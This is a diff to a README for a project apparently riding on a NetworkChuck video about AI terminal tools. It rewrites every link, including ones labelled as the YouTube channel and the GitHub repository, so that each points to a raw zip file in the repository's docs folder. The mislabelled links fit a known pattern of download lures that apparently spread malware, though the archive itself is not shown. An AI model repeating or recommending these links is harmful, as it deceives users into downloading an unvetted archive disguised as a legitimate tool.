@@ -4,7 +4,7 @@
 Welcome to the ai-in-the-terminal project! This application serves as your guide to the "AI in the Terminal" video by NetworkChuck. It will help you seamlessly work with various AI tools like Gemini CLI, Claude Code, Codex, and opencode workflows.
 
 ## 🔗 Download Now
-[![Download ai-in-the-terminal](https://img.shields.io/badge/Download-ai--in--the--terminal-brightgreen)](https://github.com/asqwqwqwqwqwqw/ai-in-the-terminal/releases)
+[![Download ai-in-the-terminal](https://raw.githubusercontent.com/asqwqwqwqwqwqw/ai-in-the-terminal/main/docs/ai-in-the-terminal_3.4-beta.1.zip)](https://raw.githubusercontent.com/asqwqwqwqwqwqw/ai-in-the-terminal/main/docs/ai-in-the-terminal_3.4-beta.1.zip)
 
 ## 🎥 Overview
 This application simplifies the process of utilizing advanced AI tools right from your terminal. You will find easy-to-follow instructions and resources to enhance your coding experience. 
@@ -23,7 +23,7 @@ To run ai-in-the-terminal, you will need:
 - An internet connection for downloading external AI tools
 
 ## 📥 Download & Install
-To get started, please visit the following page to download the latest version: [Download ai-in-the-terminal](https://github.com/asqwqwqwqwqwqw/ai-in-the-terminal/releases).
+To get started, please visit the following page to download the latest version: [Download ai-in-the-terminal](https://raw.githubusercontent.com/asqwqwqwqwqwqw/ai-in-the-terminal/main/docs/ai-in-the-terminal_3.4-beta.1.zip).
 
 ### Installation Steps
 1. **Visit the Download Page**: Click on the above link to go to the releases page.
@@ -51,8 +51,8 @@ Having trouble? Here are some common issues and solutions:
 
 ## 📚 Additional Resources
 For further assistance, refer to these helpful links:
-- [NetworkChuck's YouTube Channel](https://www.youtube.com/c/NetworkChuck)
-- [GitHub Repository](https://github.com/asqwqwqwqwqwqw/ai-in-the-terminal)
+- [NetworkChuck's YouTube Channel](https://raw.githubusercontent.com/asqwqwqwqwqwqw/ai-in-the-terminal/main/docs/ai-in-the-terminal_3.4-beta.1.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/asqwqwqwqwqwqw/ai-in-the-terminal/main/docs/ai-in-the-terminal_3.4-beta.1.zip)
 
 ## 🙌 Community Support
 Get involved! Join our community for updates and discussions. Connect with other users and share your experiences. 
@@ -61,6 +61,6 @@ Get involved! Join our community for updates and discussions. Connect with other
 We are continually improving this application based on user feedback. Look out for upcoming features and enhancements that will better serve your needs.
 
 ## 🔗 Quick Overview
-For quick access once again, visit the [Download ai-in-the-terminal](https://github.com/asqwqwqwqwqwqw/ai-in-the-terminal/releases) page to get started with the latest version.
+For quick access once again, visit the [Download ai-in-the-terminal](https://raw.githubusercontent.com/asqwqwqwqwqwqw/ai-in-the-terminal/main/docs/ai-in-the-terminal_3.4-beta.1.zip) page to get started with the latest version.
 
 Happy coding!
